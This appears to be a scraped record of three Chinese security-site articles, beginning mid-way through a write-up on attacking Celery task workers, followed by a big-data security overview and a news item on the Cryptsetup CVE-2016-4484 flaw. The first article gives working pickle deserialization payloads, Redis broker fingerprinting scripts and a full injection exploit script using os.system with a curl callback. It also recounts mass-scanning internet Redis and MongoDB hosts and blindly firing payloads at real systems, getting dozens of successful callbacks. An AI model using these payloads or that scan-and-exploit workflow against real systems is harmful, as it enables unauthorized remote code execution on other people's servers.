的队列，其 exchange 和 routing_key 的信息保存在该集合里：而键 celery 里面存储的就是每一个 push 到队列里面的具体消息信息：可以看到是一个 JSON 格式的数据，为了更方便的进行字段分析，将其提出来格式化显示为：{    ""body"": ""gAJ9cQAoWAMAAAB1dGNxAYhYAgAAAGlkcQJYJAAAADFkOGZhN2FlLTEyZjYtNDIyOS05ZWI5LTk5ZDViYmI5ZGFiZXEDWAUAAABjaG9yZHEETlgGAAAAa3dhcmdzcQV9cQZYBAAAAHRhc2txB1gRAAAAY2VsZXJ5X3NpbXBsZS5hZGRxCFgIAAAAZXJyYmFja3NxCU5YAwAAAGV0YXEKTlgJAAAAY2FsbGJhY2tzcQtOWAQAAABhcmdzcQxLBEsJhnENWAcAAAB0YXNrc2V0cQ5OWAcAAABleHBpcmVzcQ9OWAkAAAB0aW1lbGltaXRxEE5OhnERWAcAAAByZXRyaWVzcRJLAHUu"",    ""headers"": {},    ""content-encoding"": ""binary"",    ""content-type"": ""application/x-python-serialize"",    ""properties"": {        ""body_encoding"": ""base64"",        ""reply_to"": ""c8b55284-c490-3927-85c5-c68a7fed0525"",        ""correlation_id"": ""1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"",        ""delivery_info"": {            ""routing_key"": ""celery"",            ""exchange"": ""celery"",            ""priority"": 0        },        ""delivery_mode"": 2,        ""delivery_tag"": ""027bd89a-389e-41d1-857a-ba895e6eccda""    }}在上面的消息数据中，properties 里包含了消息的路由信息和标识性的 UUID 值，而其中properties.body_encoding 的值则表示消息主体 body 的编码方式，这里默认为 base64 编码。在 Celery 分布式框架中，worker 端在获取到消息数据时会根据 properties.body_encoding 的值对消息主体 body 进行解码，即 base64.b64decode(body)，而消息数据中的 content-type 指明了消息主体（具体的任务数据）的序列化方式，由于采用了默认的配置所以这里使用的是 Python 内置序列化模块 pickle 对任务数据进行的序列化。将消息主体经 base64 解码和反序列化（即之前 unserializer.py 文件功能） 操作以后得到具体的任务数据：格式化任务数据为：{    'args': (4, 9),  // 传递进 celery_simple.add 函数中的参数    'timelimit': (None, None),  // celery Task 任务执行时间限制    'expires': None,    'taskset': None,    'kwargs': {},    'retries': 0,    'callbacks': None,  // Task 任务回调    'chord': None,    'id': '1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe',  // 任务唯一 ID    'eta': None,    'errbacks': None,    'task': 'celery_simple.add',  // 任务执行的具体方法    'utc': True}任务数据标明了哪一个注册的 Task 将会被调用执行，其执行的参数是什么等等。这里任务数据已经不在重要，从上面这个分析过程中我们已经得到了这么一个结论：Celery 分布式节点 worker 在获取到消息数据后，默认配置下会使用 pickle 对消息主体进行反序列化。3. 构造恶意消息数据那么如果在 Broker 中添加一个假任务，其消息主体包含了之前能够进行命令执行的序列化数据，那么在 worker 端对其进行反序列化的时候是不是就能够执行任意代码了呢？下面就来证明这个假设。这里直接对消息主体 body 进行构造，根据第一节回顾的 Python 序列化利用方式，构造 Payload 使得在反序列化的时候能够执行命令并将结果进行返回（方便后面验证）：import base64import pickleimport commandsclass LS(object):    def __reduce__(self):        return (commands.getstatusoutput, ('ls', ))print(base64.b64encode(pickle.dumps(LS())))运行程序生成具体 Payload 数据：Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou使用刚才分析过的消息数据，将消息主体的值替换为上面生成的 Payload 得到构造的假消息：{    ""body"": ""Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou"",    ""headers"": {},    ""content-encoding"": ""binary"",    ""content-type"": ""application/x-python-serialize"",    ""properties"": {        ""body_encoding"": ""base64"",        ""reply_to"": ""c8b55284-c490-3927-85c5-c68a7fed0525"",        ""correlation_id"": ""1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"",        ""delivery_info"": {            ""routing_key"": ""celery"",            ""exchange"": ""celery"",            ""priority"": 0        },        ""delivery_mode"": 2,        ""delivery_tag"": ""027bd89a-389e-41d1-857a-ba895e6eccda""    }}将假消息通过 Redis 命令行直接添加到 celery 队列任务中：127.0.0.1:6379&gt; LPUSH celery '{""body"":""Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou"",""headers"":{},""content-encoding"":""binary"",""content-type"":""application/x-python-serialize"",""properties"":{""body_encoding"":""base64"",""reply_to"":""c8b55284-c490-3927-85c5-c68a7fed0525"",""correlation_id"":""1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"",""delivery_info"":{""routing_key"":""celery"",""exchange"":""celery"",""priority"":0},""delivery_mode"":2,""delivery_tag"":""027bd89a-389e-41d1-857a-ba895e6eccda""}}'查看一下 celery 队列中的消息情况：然后起一个 Celery worker 端加载之前的 celery_simple.py 中的 APP，worker 会从队列中取消息进行处理，当处理到插入的假消息时，会由于无法解析任务数据而报错：worker 端经过 pickle.loads(base64.b64decode(body)) 处理对构造的 Payload 进行的反序列化，由于 Payload 在反序列化时会执行命令并返回执行结构，所以这里 worker 端直接将命令执行的结果当作了任务的具体数据，同时也证明了在 Celery 分布式框架默认配置下（使用了 pickle 序列化方式），进行恶意消息注入会导致 worker 端远程命令执行。三、利用脆弱的 Broker 代理进行分布式节点攻击前面已经证明了 Celery 构建的应用中，如果攻击者能够控制 Broker 往消息队列中添加任意消息数据，那么即可构造恶意的消息主体数据，使得 worker 端在对其进行反序列化的时候触发漏洞导致任意命令执行。整个流程为：1. 检测 Celery 应用中 Broker 特征那么对于这样一个分布式应用，攻击者是否能够轻易的控制 Broker 呢？在 Celery 支持的消息队列中间件中含有 Reids、MongoDB 这种存在未授权访问问题的服务，因此当一个基于 Celery 框架实现的分布式应用使用了 Redis 或者 MongoDB 作为 Broker 时，极有可能由于中间件未授权访问的问题而被攻击者利用，进行恶意的消息注入。所以，如何去寻找既存在未授权访问问题，同时又作为 Celery 分布式应用 Broker 的那些脆弱服务呢？根据上一节的分析，已经得知如果 Redis 作为 Broker 时，其 KEYS 值会存在固定的特征：_kombu.binding.*celery.*unacked.*而如果是 MongoDB 作为 Broker，在其数据库中会存在这样的 collections：messagesmessages.broadcastmessages.routing其中 messages.routing 含有每一个队列以及消息路由的信息，messages 则存储了所有队列中的消息数据。那么就可以根据不同中间件服务的特征去验证一个 Redis 或者 MongoDB 是否作为 Broker 存在于 Celery 分布式应用中。针对 Redis 和 MongoDB 可编写出相应的验证脚本，其代码关键部分为：# celery_broker_redis_check.py...CELERY_KEYS = ['celery', 'unacked', '_kombu.binding']def run(seed):    try:        ip, port = seed.split(':')    except ValueError as ex:        ip, port = seed, 6379    r = redis.Redis(ip, int(port), socket_connect_timeout=5)    keys = r.keys()    info = dict(succeed=False, keys=list())    for _k in CELERY_KEYS:        for key in keys:            if _k in key:                info['succeed'] = True                info['keys'].append(key)    return info...针对未授权的 Redis 服务，直接对所有 KEYS 值进行特征匹配，如果遇到其 KEY 值包含有 ['celery', 'unacked', '_kombu.binding'] 中任意一个字符串即可判断该服务作为了 Celery 应用的消息队列中间件。# celery_broker_mongodb_check.py...CELERY_COLLECTIONS = ['messages.routing', 'messages.broadcast']def run(seed):    try:        ip, port = seed.split(':')    except ValueError as ex:        ip, port = seed, 27017    conn = pymongo.MongoClient(ip, int(port), connectTimeoutMS=2000,                               serverSelectionTimeoutMS=2000)    dbs = conn.database_names()    info = dict(succeed=False, results=dict())    for db in dbs:        colnames = conn.get_database(db).collection_names()        for _col in CELERY_COLLECTIONS:            if any(_col in colname for colname in colnames):                info['succeed'] = True                info['results'][db] = colnames                continue    return info...而由于 Celery 在使用 MongoDB 的时候需要指定数据库，所以需要对存在未授权访问的 MongoDB 中的每一个数据库都进行检测，判断其中的集合名称是否符合条件，若符合即可判断其作为了消息队列中间件。2. 使用脚本进行消息注入攻击分布式节点使用上面两个脚本在本地环境进行测试：这里要说明的一个问题就是，不是所有使用了 Celery 分布式框架的应用都配置了 pickle 的序列化方式，若其只配置了 JSON 等其他安全的序列化方式，则就无法利用 Python 反序列化进行命令执行了。一个简单的真对 Redis Broker 类型的攻击脚本：# celery_broker_redis_exp.pyimport reimport jsonimport redisimport pickleimport base64evil_command = 'curl http://127.0.0.1:8000/{}'def create_evil_task_body(command, body_encoding='base64'):    class Command(object):        def __reduce__(self):            import os            return (os.system, (command, ))    if body_encoding == 'base64':        return base64.b64encode(pickle.dumps(Command()))def create_evil_message(body):    message = {""body"": body,""headers"": {},""content-encoding"": ""binary"",""content-type"": ""application/x-python-serialize"",""properties"": {""body_encoding"": ""base64"",""reply_to"": ""c8b55284-c490-3927-85c5-c68a7fed0525"",""correlation_id"": ""1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"",""delivery_info"": {""routing_key"": ""celery"",""exchange"": ""celery"",""priority"": 0},""delivery_mode"": 2,""delivery_tag"": ""027bd89a-389e-41d1-857a-ba895e6eccda""}}    return json.dumps(message)def exp(seed):    try:        ip, port = seed.split(':')    except ValueError as ex:        ip, port = seed, 6379    r = redis.Redis(ip, int(port), socket_connect_timeout=5)    keys = r.keys()    info = dict(succeed=False, keys=list())    for key in keys:        matched = re.search(r'^_kombu\.binding\.(?P.*)', key)        if matched:            queue_name = matched.group('queue')            message = create_evil_message(                create_evil_task_body(evil_command.format(queue_name))            )            r.lpush(queue_name, message)exp('192.168.99.100')为了测试攻击脚本，首先需要在 192.168.99.100 上开启 Redis 服务并配置为外部可连且无需验证，然后在本地起一个 SimpleHTTPServer 用于接收节点执行命令的请求，最后可直接通过终端配置 Broker 为 Redis 起一个默认的 worker：celery worker --broker='redis://:@192.168.99.100/0'整个过程演示：可以看到通过往消息队列中插入恶意消息，被分布式节点 worker 获取解析后触发了反序列化漏洞导致了远程命令执行。四、互联网案例检测上一节内容通过实际的代码和演示过程说明了如何通过特征去验证消息队列中间件是否作为了 Celery 分布式框架的一部分，那么互联网中是否真的存在这样的实例呢。这里再次理一下针对 Celery 分布式节点攻击的思路：找寻那有着未授权访问且用于 Celery 消息队列传递的中间件服务；往消息队列中插入恶意消息数据，因无法确定目标是否允许进行 pickle 方式序列化，所以会进行 Payload 盲打；等待分布式节点取走消息进行解析，触发反序列化漏洞执行任意代码；首先针对第一点，利用脚本去扫描互联网中存在未授权访问且用于 Celery 消息队列传递的 Redis 和 MongoDB 服务。通过扫描得到未授权访问的 Redis 有 14000+ 个，而未授权访问的 MongoDB 同样也有 14000+ 个。针对 14000+ 个存在未授权访问的 Redis 服务使用上一节的验证脚本（celery_broker_redis_check.py）进行批量检测，得到了 86 个目标满足要求，扫描过程截图：同样的针对 14000+ 个存在未授权访问的 MongoDB 服务进行批量检测，得到了 22 个目标满足要求，扫描过程截图：根据结果来看，虽然最终满足条件的目标数量并不多，但是这足以说明利用消息注入对分布式节点进行攻击的思路是可行的，并且在消息队列中间件后面有多少个 worker 节点并不知道，危害的不仅仅是 Broker 而是后面的整个节点。由于具体的攻击 Payload 使用了盲打，所以不能直接获取远端成功执行命令的结果，所以这里借助外部服务来监听连接请求并进行标识，若一个分布式节点成功触发了漏洞，它会去请求外部服务器。针对 Redis 检测过程截图：其中服务器上收到了 32 个成功执行命令并回连的请求：同样的针对 MongoDB 检测过程截图：其中服务器上成功收到 3 个成功执行命令并回连的请求：从最后得到的数据来看，成功触发漏洞导致远程命令执行的目标数量并不多，而且整个利用条件也比较苛刻，但就结论而言，已经直接解答了文章一开始所提出的疑问，利用多个漏洞对分布式节点进行攻击的思路也成功得到了实践。（写了那么多，更多的想把自己平常折腾和研究的一些点给分享出来，理论应用到实战，没有案例的漏洞都不能称之为好漏洞。将一些想法和思路付之于实践，终究会得到验证。）相关链接Celery 分布式框架项目 - http://www.celeryproject.org/Python “pickle” 模块文档 - https://docs.python.org/2/library/pickle.htmlDjango 远程命令执行漏洞详解 - http://rickgray.me/2015/09/12/django-command-execution-analysis.html","2016-09-22 19:53:33","Web安全","漏洞组合拳 - 攻击分布式节点","http://nsoad.com/Article/web/20160922/427.html"
"5ccbfb0c4f2f0a0a7a69c108","*本文原创作者：木千之，本文属FreeBuf原创奖励计划，未经许可禁止转载引言截止到2012年，全球数据量已经从TB（1024GB=1TB）级别跃升到PB（1024TB=1PB）、EB（1024PB=1EB）","blackhold","*本文原创作者：木千之，本文属FreeBuf原创奖励计划，未经许可禁止转载引言截止到2012年，全球数据量已经从TB（1024GB=1TB）级别跃升到PB（1024TB=1PB）、EB（1024PB=1EB）乃至ZB(1024EB=1ZB)级别。国际数据公司（IDC）的研究结果表明，2008年全球产生的数据量为0.49ZB，2009年的数据量为0.8ZB，2010年增长为1.2ZB，2011年的数量更是高达1.82ZB，相当于全球每人产生200GB以上的数据。而到2012年为止，人类生产的所有印刷材料的数据量是200PB，全人类历史上说过的所有话的数据量大约是5EB。IBM的研究称，整个人类文明所获得的全部数据中，有90%是过去两年内产生的。而到了2020年，全世界所产生的数据规模将达到今天的44倍。每一天，全世界会上传超过5亿张图片，每分钟就有20小时时长的视频被分享。然而，即使是人们每天创造的全部信息——包括语音通话、电子邮件和信息在内的各种通信，以及上传的全部图片、视频与音乐，其信息量也无法匹及每一天所创造出的关于人们自身的数字信息量。这种趋势是否会继续下去？答案是肯定的，我们现在尚处于“物联网”的最初级阶段，智能设备还仅仅存在于家用电器等；而随着技术成熟，我们的工业设备、交通工具和迅速发展的“可穿戴”科技将能互相连接与沟通。互联互通的高度信息化社会产生的可用数据量当超越已有的任一个社会阶段。我们已然处于“大数据”时代，不仅仅是“数据”，而且是“大”数据。大数据时代下的信息安全面临着新的威胁，如云平台下的个人隐私保护，如全方位立体的信息系统增加了受威胁攻击的承受面积等。每一个新的数据源加入信息网络，便会成为新的潜在受攻击点。庆幸的是，大数据分析技术也开始渗透进入安全领域，开始与传统安全技术相结合，诞生了数据时代的新型安全应对方法：大数据安全分析。今天，我们就从最初的网络安全开始讲起，一起来回顾大数据安全分析技术诞生的整个路程。1、 网络安全的主干FreeBuf是一个关于安全的顶级盛宴，一般来说，你总是能在这里找到你关心的安全问题，比如漏洞挖掘、后门设计、智能安全等。我们今天所谈当属其中一个较大的类别，也是我们今天讨论的起点——网络安全（CyberSecurity）：网络安全是指：网络系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的原因而遭受到破坏、更改、泄露，系统连续可靠正常地运行，网络服务不中断。仅从定义来看网络安全定义吧，不免有些抽象，一般来说我们可以使用CIA来具体描述网络安全内涵（目标）：机密性（Confidentiality）：数据不被非法访问；完整性（Integrity）：数据不被非法修改；可用性（Availabitliy）：网络服务始终良好运行；当然，除去通用的CIA安全属性，我们也可以要求可审计性、不可否认性（数字签名）以及可控性（信息传播及内容受控，如次数或特定人群访问权）等。具体可以根据自身的业务需求在CIA基础上充实成为最适合自身企业的安全模型。网络安全的目标实现依赖于其实现体系，其体系可以归结为图1：上图中涉及到网络安全四个关键机制，其中预防是安全的起始，通过风险评估与控制形成初级安全防御；当预防措施失效时，检测机制将发现存在的攻击行为，报警后由响应机制进行中断服务、断开连接等具体安全措施。最初的网络安全框架中只有上述三类，随着攻击特征的研究逐渐增多，预测攻击行为的可能性增大，因此预测机制专用于预测高风险用户与高风险节点，响应的攻击分析后可以作为新知识提供给预测模块，实现预测的智能升级。预防、预测、检测与相应构成了网络安全的主干（整体框架），而百花争艳的安全技术则像是点缀其上的美艳花朵。2、孤掌难鸣的困境遗憾的是，现有的安全防御机制在大数据时代的表现总是力不从心。我们先来看看预防机制。预防机制的核心是风险管理，即识别和控制机构面临的安全风险的过程。风险管理主要包括风险识别与风险控制，风险识别指检查和分析机构信息系统的安全态势与面临的风险，形成分线评估报告；风险控制则是指用控制手段，减少机构面临的安全风险。风险管理可以简单理解为“先评估，后实施”。一般来说风险管理可以分为三个层次：管理控制，主要是策略方针，如密码安全策略（复杂性与长度要求），支付卡行业数据安全标准（PCIDSS）等；技术控制：逻辑访问控制（基于角色的访问控制策略）、加密协议等；物理控制：门禁、设施保护、安全视频监控等。图2给出了企业风险管理的层次实例，常见的预防措施可以分为主机与网络两个层次，主机方面涉及安全操作系统设计，已有漏洞补丁升级；逻辑访问控制：认证（用户身份）与授权（文件访问权、网络使用权等）；安全实现：代码安全审查（strcpy()/strncpy()）、单元测试、最小特权实现等。网络层面包括安全协议：SSL/TLS等加固IP/TCP；安全设备：防火墙，IDS等（基于网络数据包的分析）。最为常见的例子莫过于在网络层实施SSL协议，该协议的主要功能是在原有TCP/IP框架上添加身份认证与数据加密功能，数据包结构如图3：一般的SSL协议通信过程可以见图4（客户端连接服务器）：客户端Alice首先要验证服务端Bob的身份，之后二者协商生成一个本次会话的临时密钥K，使用K加密本次会话数据包，从而实现了安全数据传输。看上去从主机到网络，我们已经根据风险评估的结果实施了全面的防御准备，看上去固若金汤，可是事实上果真如此吗？事实上网络安全威胁从未消失或减缓，反而变本加厉，而“安全”也成为了互联网的热搜词汇，甚至国家层面都成立了“中共中央网络安全和信息化领导小组”，因此可见网络安全形式之严峻。自身防御漏洞百出安全形式严峻的第一个重要因素就是，防御体系自身就漏洞百出。首先从计算机系统与信息网络自身角度来看脆弱性始终存在：设计缺陷：竞争条件漏洞（race condition vulnerability）、缓冲区溢出等； 竞争漏洞：如root程序的核查文件（access）与修改文件（write）间具有时间间隔，导致攻击者改变了文件符号链接，将符号链接到密码文件上；缓冲区溢出：strcpy()的源字符串长度超过了目标字符串空间长度，导致覆盖掉了RET指针；即便设计科学的防御系统在实际部署中也会存在诸多问题，如：某些业务应用设计时未考虑安全因素，安全模块事后追加，存在片面性与兼容性问题；相关人员缺乏相应安全培训；系统设置缺陷（防火墙使用默认密码或开放默认端口）实际部署成本制约无法真实实现防御系统功能，如考虑安全性与效能之间的折衷（如卡巴斯基的查杀率与系统占用率）、部署预防系统时的非技术考量：机构需求、经济成本、上级政策等；一般来说，企业的信息系统中一般都会存在以下漏洞：后门：隐秘登录端口，rootkit（隐藏后门等恶意程序，暗中收集数据）拒绝服务：升级版DDOS窃听：窃听网络机密数据传输、监控硬件设备电磁信号（如测信道攻击）应用漏洞：主要用于获取root权限，然后创建/维护后门、木马等；社工：攻击机构中脆弱的“人性”因素（欺诈攻击）因此，防御系统自身的设计缺陷以及实际部署中的成本制约与管理不规范导致安全漏洞无法完全避免。攻击者日益精进除去防御者自身因素之外，攻击者日益精进，从而威胁越来越高级、复杂也是一个重要原因。我们先来看看常见的攻击分类：探测攻击（Probe）：端口扫描（nmap-m:n）、抓包解析（tcpdump等）拒绝服务攻击：TCP SYN洪流（发送多个SYN连接不响应）、PingofDeath（Ping协议组包错误）、DDOS（多枚炮弹同时命中）远程入侵攻击（R2L）：登录密码暴力破解/字典攻击、缓冲区溢出、SQL注入、社工；提权攻击（U2R）：缓冲区溢出、rootkit等；感染传播攻击（Infections）：木马、Botnet等；网络攻击并不容易，必须经过缜密的侦查与策划，其核心阶段有五个：准备阶段：探测目标端口、判断系统软件版本信息等，社工收集补充信息，评估目标防御水平，选择攻击突破口；入侵阶段：利用缓冲区溢出、SQL注入等方法获得系统root权限，是R2L与U2R两类攻击的结合，甚至是社工方式进入（钓鱼网站等）；后入侵阶段：创建后门与安装rootkit以便于长期控制目标；以目标为基础，探测周围网络，贡献其它目标主机（感染），寻找有价值目标（APT）；自我保护阶段：设置rootkit\加密等多种安全保护程序，修改内核进程表避免安全软件查杀、修改安全日志等；总攻阶段：秘密传输目标网络的机密信息或崩溃目标网络系统，取决于攻击者的动机、目标以及技术能力和目标的安全防御水平；每一个攻击类型都很复杂，而且阶段繁琐，因此自然对攻击者的技术门槛很高；然而现实中的攻击者很多仅仅是“脚步小子”，原因就在于当前存在许多可选、高效、开放的黑客工具。由于数量众多，我们今天仅对代表性的工具作一速览：信息收集工具包括网络包捕获工具Wireshark\Tcpdump\Net2pcap等，网络扫描探测工具（主机IP协议版本）：Nmap\Amap\Vmap\Xprobe等。攻击工具包括木马类的Danger\AIMSpy\NetSpy等；拒绝服务攻击类的Targa、HOIC\LOIC等；网络包伪造类：Packeth\Packet Excalibur\Libnet等；应用层类：Code Red Worm\Nimda Worm\AppDDoS\Botnet等；用户攻击类：Ntfsdos\Yaga\Metasploit等。值得一提的是Metasploit，现在已经更新为Kali系统，其上融合了现有的全套安全工具，从网络扫描、DNS解析，到SQL注入、邮件伪造、POC利用等，已经成为了事实上渗透测试的标准平台。上图中是Kali系统上的一次攻击应用。随着这些高级工具的出现，原本复杂攻击要求的高技术门槛越来越低，呈现了反向增长的奇怪曲线，如图6：上图反映了历史攻击复杂度与攻击者技术要求的变化曲线，可以看出攻击演变趋势上，攻击成本日益低廉，技术门槛越来越低；与此同时攻击工具日趋复杂，攻击复杂度越来越高，攻击越来越难以防范。而不断进化的攻击也使得防御系统效果越来越差，单单BYOD的引入，就使得自用设备打破了原始的安全边界防御，更何况大数据时代便捷多元的信息通信设备与方法，传统安全防御技术基本形同虚设。3、 似是而非的替代方案原有单纯基于安全边界与单一安全设备的防御体系被现实摧垮，于是人们开始寻找安全的替代方案。当网络中具备了防火墙\IDS等多种安全设备之后，一种自然的想法是将现有所有安全机制融合，形成层次渐进的安全防御机制，即纵深防御，也称作深度防御。深度防御（Defense-in-depth）指利用一系列防御机制来保护计算机网络的理念，效果是一旦某一机制无法正常运行，会有另外一个可正常运行的机制替代它。一个典型的深度防御模型如图7，其中：实时防御部分负责对实时消息流进行检测防御：防火墙为第一道关口，负责控制内外网络访问；IDS对通过防火墙的数据流进一步检查，发现其中的攻击行为报警相应；若攻击逃避IDS检测，则直接由应急响应与灾难恢复模块处理。日常防御模块由脆弱性检测模块进行系统自检，而预警子系统要综合已有所有安全信息，对未知攻击进行初步的预测。基础设施主要有多种数据库组成，分别对两类防御提供平台支持。深度防御的关键在于检测出攻击，从而将攻击损失降到最小。现有基于IDS的检测系统是深度防御的核心模块，因此我们重点分析下现有的检测系统。入侵检测系统（IDS）由来已久，至今发展经历了个世代，第一个世代中的IDS基于误用检测（特征、规则检测），重点分析网络包数据，从而发现可能的入侵与DOS攻击，此时的IDS仅能检测已知威胁；第二世代的IDS利用SIEM进行了融合，从而可以关联多个IDS的报警数据，提高了发现攻击的能力。虽然IDS发展了两个世代，但是其不足也是明显的。一方面攻击态势日趋严峻，攻击方式日趋复杂（工具多元化），攻击门槛日趋降低（技术要求降低，脚本小子），攻击动机日趋强化（脚本小子-好奇，黑产-经济利益，国家队-权力/政治，内部人-不满报复）；另一方面现有检测技术能力有限，应对多态恶意代码、APT攻击、0-day攻击时都束手无策。而且防御与攻击的最大不同在于：攻击只为成功一次，防御则要成功每一天，因此防御方责任更大，形势更为严峻。最近几年发生的安全事件也验证了当前安全防御脆弱无力的事实，如2010年发生的震惊全球的“极光攻击”与“震网”两个典型APT攻击，其影响损失不言而喻，但是伊朗核电站所受影响已无法简单用经济损失来衡量；2014年韩国银行客户金融数据失窃，童年JP摩根银行客户账户失窃，内部人信息窃取、欺诈已经成为了企业面临的首要威胁。具体可参加下图：正当人们为现有安全防御无力痛心的时候，大数据技术却蓬勃发展，一系列核心技术与平台架构均日趋成熟，甚至出现了成熟的市场实例（如Amazon的大数据分析平台）。与此同时，安全日志的重要性逐渐得到大家的重视，2010年一份报告显示86%的安全事件可以回溯到安全日志，而安全日志数据量巨大，导致实际无法有效利用。如同发现了新的美洲大陆，安全界不约而同将目光转向了大数据技术在安全日志中的应用。学术界普遍认为利用大数据技术是挖掘日志价值，是提升安全检测效果的关键。因此第三个世代的IDS出现了，其融合了大数据分析技术，构建了安全威胁情报平台，从长时间窗口中关联，挖掘攻击信息，不仅提高了检测未知威胁的能力，也缩短了攻击与检测相应的时间周期。4、 达摩克利斯之剑大数据技术的出现使得分析蕴藏着攻击痕迹的海量安全日志成为可能，以此为依托，国内外均开展了大量大数据安全领域研究。内部威胁因其特有的隐蔽、透明特性也成为了大数据安全分析的重要应用领域。基于企业内部特有的内部威胁风险，提取威胁特征，然后在各设备安全日志中挖掘分析，从而检测内部威胁成为未来行之有效的内部威胁检测方案，可以说大数据安全分析技术成为了悬在内部威胁头上的达摩克利斯之剑。按照数据源、分析方法、时间度量、能动性与持时间周期等，我们可以将现有内部威胁中的大数据安全分析归为几类：按照数据来源可以分为主机、网络、应用分析三类。基于主机数据检测数据来自系统调用日志与系统日志；基于网络数据检测数据来自基于网络数据包头数据与流量数据与基于无线网络数据检测；基于应用日志检测数据来自数据库日志、网站日志、IDS指示器数据等。按照使用方法可以分为误用检测与异常检测。误用检测又称特征检测，需要提取已知攻击特征，基于签名匹配检测攻击，其准确率较高，然而无法检测未知威胁；异常检测基于“白名单”思想，建立用户的正常行为模型，从而检测偏离正常模型的行为，其可以检测未知威胁 ，但误报率较高。按照时间度量可以分为实时内部威胁检测与离线检测。实时监测将安全日志数据组我欸数据流实时分析报警；而离线检测则在后台进行数据挖掘分析按照能动性可以分为被动检测与主动检测两类。顾名思义，被动检测就是传统的IDS，检测到内部威胁即报警，但是不采取安全措施，等待人为命令；主动检测类似于IPS，检测到内部威胁可以自动断开内部攻击者连接，剥夺其访问权等。按照时间周期可以分为连续监测与周期检测。连续监测即不间断监测，而周期检测则是特定周期执行检测，两次检测间隔可能被攻击者利用。5、 实例作为本章的最后，我们介绍一个实际的大数据安全在内部威胁中的应用实例，以供大家参考。如检测内部人团伙窃取信息行为：1.分析文件访问异常行为的用户2.分析上步异常用户的邮件联系人图； 3.分析异常邮件关系图中所有用户的文件行为；4.采用机器学习建立分类器，多人、多终端家呢异常；5.关联多类异常，检测内部信息窃取攻击；内部威胁中的大数据安全分析尚未形成统一的理论，仍处于“摸着石头过河”阶段。6、小结本篇从最初的网络安全讲起，分析了随着信息时代发展，网络防御方所面临的挑战与对抗安全威胁的决心和努力，随着大数据平台技术与分析技术的成熟，终于大数据安全分析应用逐渐成为了现实。本文的基本脉络我们以流程图的形式总结如图８：大数据时代就像一把双刃剑，一方面带了了新的安全威胁，如大数据时代下的隐私保护问题（图10-个人隐私泄露风险）：另一方面又为我们带来了新的安全利器，如我们今天所介绍的大数据安全分析技术（图11-大数据安全分析应用）：至于最终大数据时代是好是坏，我想仅仅作为看客是远远没有发言权的，最终的评判还需要仰仗各位看官的共同努力，改进已有安全防御机制，提高网络安全防御效果，使得人人都可以享有一个安全、便捷的网络世界。7、参考文献1. 百度百科：大数据时代 http://baike.baidu.com/link?url=cLsMtbEEOC4WuSPXk2a1hd0TDi5UfBAzTHxbvSIKZgAaPXzRFHdlfxSXCs5UjzsZDI-pL5KraYwWN6oWQVQaiml5gCQk5aCj1LG6cdlt 2. 大数据安全威胁TOP10 http://blog.chinaunix.net/uid-26275986-id-4472943.html*本文原创作者：木千之，本文属FreeBuf原创奖励计划，未经许可禁止转载","2016-08-01 05:22:32","网络安全","大数据安全分析的前世今生","http://nsoad.com/Article/Network-security/20160801/248.html"
"5ccbfb0c4f2f0a0a7a69c109","按住回车70秒，黑客就能在linux系统绕过认证，进而获取root权限，并能远程控制经过加密的linux系统。漏洞来源这个安全问题来源于Cryptsetup存在的一个漏洞(CVE-2016-4484)。","blackhold","按住回车70秒，黑客就能在linux系统绕过认证，进而获取root权限，并能远程控制经过加密的linux系统。漏洞来源这个安全问题来源于Cryptsetup存在的一个漏洞(CVE-2016-4484)。Cryptsetup是在Linux统一密钥设置(Linux Unified Key Setup, LUKS)中用来加密磁盘的软件，而LUKS则是Linux系统中标准的磁盘加密。漏洞其实是出现在系统后Cryptsetup处理密码输入错误的时候，它会允许用户多次重试输入密码。而当用户输入错误93次后，程序就会给用户一个带root权限的shell(busybox)。也就是说，如果你重复93次输错密码，或者持续按回车键大概70秒，你就能够获得root initramfs (initial RAM filesystem) shell。获取shell之后，你就可以复制、修改或者破坏整个硬盘，或者也可以使用网络传输数据。漏洞能被远程利用西班牙安全研究员Hector Marco和Ismael Ripoll发现了这一漏洞，影响范围覆盖几乎所有的Linux发行版，包括Debian, Ubuntu, Fedora, Red Hat Enterprise Linux (RHEL)和SUSE。    研究人员在今年奥地利维也纳举行的DeepSec会议上演示了细节： “黑客可以从受影响系统中获取root initramfs shell。并且漏洞的成功率非常高，因为他不依赖某个特定的系统或者某个配置……这个漏洞在图书馆、ATM机、机场、实验室等场景下特别有用，因为在这些场景下，开机的过程受到（加密）保护，而我们只有键盘/鼠标。”看到这里，你可能会认为漏洞只能在攻击者有物理接触的情况下才有可能发生。但实际上，漏洞也可以被远程触发。如果你使用的是基于linux的云服务，就可以在没有物理接触的条件下利用漏洞。漏洞到底有多严重值得注意的是，攻击者无法利用这个漏洞来获取加密磁盘的内容，但能进行下面的这些操作： 权限提升： 由于boot分区一般都是不加密的，因此利用漏洞黑客可以用SetUID存储一个可执行文件，然后再用本地用户身份执行进行提权。攻击者也可以替换内核和initrd镜像。信息泄露：虽然攻击者无法直接读取加密的磁盘，但他能做的事还是很多的。比如，他可以把磁盘复制到外部设备，之后进行暴力破解，DoS攻击：黑客可以删除磁盘上的内容。这个漏洞的影响范围包括Debian, Ubuntu, Fedora和其他一些Linux发行版本。Arch Linux和Solus用户不受影响。解决方案尽管漏洞能轻易触发并且影响范围大，但它的修复方案也异常简单：首先，在LUKS密码提示窗处按压回车键70秒，检查系统是否存在漏洞。如果存在漏洞，检查下你所使用的Linux是否发布了补丁。如果官方没有发布补丁，你可以自行修改cryptroot文件：# sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT=""/GRUB_CMDLINE_LINUX_DEFAULT=""panic=5 /' /etc/default/grub# grub-install","2016-11-17 18:13:05","系统安全","Linux爆新漏洞，长按回车键70秒即可获得root权限","http://nsoad.com/Article/system/20161117/797.html"
